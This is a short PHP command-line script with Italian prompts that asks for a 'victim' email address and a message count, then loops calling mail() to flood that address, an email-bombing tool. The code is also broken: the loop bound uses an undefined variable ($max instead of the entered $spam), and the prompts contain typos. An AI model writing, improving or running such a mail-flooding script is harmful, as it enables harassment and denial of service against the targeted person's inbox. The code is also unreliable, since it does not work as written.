<?php

echo "\nInserisci la email vittima: ";
$mail = trim(fgets(STDIN));
echo "\nInsefisci il numero di email da inviare: ";
$spam = trim(fgets(STDIN));
echo "Inizio a stormare, per modificare il testo modificaa variabile text\n";

$text = "aced";

for ($i=1; $i<=$max; $i++){
	mail($mail, 'Oggetto', $text);
	}
	
	?>
